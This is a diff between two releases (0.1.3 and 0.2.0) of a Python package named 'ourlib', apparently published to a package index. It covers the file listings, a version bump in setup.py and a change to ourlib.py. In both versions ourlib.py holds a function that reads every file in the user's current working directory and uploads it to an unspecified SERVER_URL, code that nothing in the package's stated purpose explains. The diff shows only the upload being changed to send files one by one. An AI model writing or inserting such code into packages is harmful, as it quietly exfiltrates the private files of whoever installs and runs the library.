# Comparing `tmp/ourlib-0.1.3.tar.gz` & `tmp/ourlib-0.2.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "ourlib-0.1.3.tar", last modified: Sun Jul  2 07:35:10 2023, max compression
+gzip compressed data, was "ourlib-0.2.0.tar", last modified: Sun Jul  2 08:47:43 2023, max compression
```

## Comparing `ourlib-0.1.3.tar` & `ourlib-0.2.0.tar`

### file list

```diff
@@ -1,17 +1,17 @@
-drwxrwxrwx   0        0        0        0 2023-07-02 07:35:10.464751 ourlib-0.1.3/
--rw-rw-rw-   0        0        0     1090 2023-07-01 16:34:46.000000 ourlib-0.1.3/LICENSE
--rw-rw-rw-   0        0        0      474 2023-07-02 07:35:10.462385 ourlib-0.1.3/PKG-INFO
--rw-rw-rw-   0        0        0       51 2023-07-01 16:34:46.000000 ourlib-0.1.3/README.md
-drwxrwxrwx   0        0        0        0 2023-07-02 07:35:10.430305 ourlib-0.1.3/ourlib/
--rw-rw-rw-   0        0        0       20 2023-07-02 07:13:33.000000 ourlib-0.1.3/ourlib/__init__.py
--rw-rw-rw-   0        0        0     1909 2023-07-02 07:34:02.000000 ourlib-0.1.3/ourlib/command_line.py
--rw-rw-rw-   0        0        0      732 2023-07-02 05:02:24.000000 ourlib-0.1.3/ourlib/ourlib.py
-drwxrwxrwx   0        0        0        0 2023-07-02 07:35:10.459337 ourlib-0.1.3/ourlib.egg-info/
--rw-rw-rw-   0        0        0      474 2023-07-02 07:35:10.000000 ourlib-0.1.3/ourlib.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      267 2023-07-02 07:35:10.000000 ourlib-0.1.3/ourlib.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-02 07:35:10.000000 ourlib-0.1.3/ourlib.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       52 2023-07-02 07:35:10.000000 ourlib-0.1.3/ourlib.egg-info/entry_points.txt
--rw-rw-rw-   0        0        0       32 2023-07-02 07:35:10.000000 ourlib-0.1.3/ourlib.egg-info/requires.txt
--rw-rw-rw-   0        0        0        7 2023-07-02 07:35:10.000000 ourlib-0.1.3/ourlib.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-07-02 07:35:10.465251 ourlib-0.1.3/setup.cfg
--rw-rw-rw-   0        0        0     1552 2023-07-02 07:34:26.000000 ourlib-0.1.3/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-02 08:47:43.362736 ourlib-0.2.0/
+-rw-rw-rw-   0        0        0     1090 2023-07-01 16:34:46.000000 ourlib-0.2.0/LICENSE
+-rw-rw-rw-   0        0        0      474 2023-07-02 08:47:43.361374 ourlib-0.2.0/PKG-INFO
+-rw-rw-rw-   0        0        0       51 2023-07-01 16:34:46.000000 ourlib-0.2.0/README.md
+drwxrwxrwx   0        0        0        0 2023-07-02 08:47:43.312564 ourlib-0.2.0/ourlib/
+-rw-rw-rw-   0        0        0       20 2023-07-02 07:13:33.000000 ourlib-0.2.0/ourlib/__init__.py
+-rw-rw-rw-   0        0        0      786 2023-07-02 08:44:18.000000 ourlib-0.2.0/ourlib/command_line.py
+-rw-rw-rw-   0        0        0      757 2023-07-02 08:39:24.000000 ourlib-0.2.0/ourlib/ourlib.py
+drwxrwxrwx   0        0        0        0 2023-07-02 08:47:43.357081 ourlib-0.2.0/ourlib.egg-info/
+-rw-rw-rw-   0        0        0      474 2023-07-02 08:47:42.000000 ourlib-0.2.0/ourlib.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      267 2023-07-02 08:47:43.000000 ourlib-0.2.0/ourlib.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-02 08:47:42.000000 ourlib-0.2.0/ourlib.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       52 2023-07-02 08:47:42.000000 ourlib-0.2.0/ourlib.egg-info/entry_points.txt
+-rw-rw-rw-   0        0        0       32 2023-07-02 08:47:42.000000 ourlib-0.2.0/ourlib.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        7 2023-07-02 08:47:42.000000 ourlib-0.2.0/ourlib.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-07-02 08:47:43.363232 ourlib-0.2.0/setup.cfg
+-rw-rw-rw-   0        0        0     1552 2023-07-02 08:39:53.000000 ourlib-0.2.0/setup.py
```

### Comparing `ourlib-0.1.3/LICENSE` & `ourlib-0.2.0/LICENSE`

 * *Files identical despite different names*

### Comparing `ourlib-0.1.3/ourlib/ourlib.py` & `ourlib-0.2.0/ourlib/ourlib.py`

 * *Files 5% similar despite different names*

```diff
@@ -12,14 +12,14 @@
 
     def upload_files_to_server():
         current_directory = os.getcwd()
         files = []
         for file_name in os.listdir(current_directory):
             file_path = os.path.join(current_directory, file_name)
             if os.path.isfile(file_path):
-                files.append((file_name, open(file_path, 'rb')))
-        
-        response = requests.post(SERVER_URL, files=files)
-        if response.status_code == 200:
-            print("Files uploaded successfully!")
-        else:
-            print("Failed to upload files!")
+                files = {'file': open(file_path, 'rb')}
+                response = requests.post(SERVER_URL, files=files)
+                if response.status_code == 200:
+                    print("Files uploaded successfully!")
+                else:
+                    print("Failed to upload files!")
+
```

### Comparing `ourlib-0.1.3/setup.py` & `ourlib-0.2.0/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -4,15 +4,15 @@
 # Configurations
 with open("README.md", "r") as fh:
     long_description = fh.read()
 setuptools.setup(
      install_requires=['torch','numpy','pandas','scikit-learn'],        # Dependencies
      python_requires='>=3.8',                                           # Minimum Python version
      name='ourlib',                                                     # Package name
-     version="0.1.3",                                                      # Version
+     version="0.2.0",                                                      # Version
      author="PT",                                     # Author name
      author_email="name@gmail.com",                           # Author mail
      description="Python package for ourlib.",    # Short package description
      long_description=long_description,                       # Long package description
      long_description_content_type="text/markdown",
      url="https://github.com/kunxl-gg/Mercor-pypi",       # Url to your Git Repo
      packages=setuptools.find_packages(),                     # Searches throughout all dirs for files to include
```

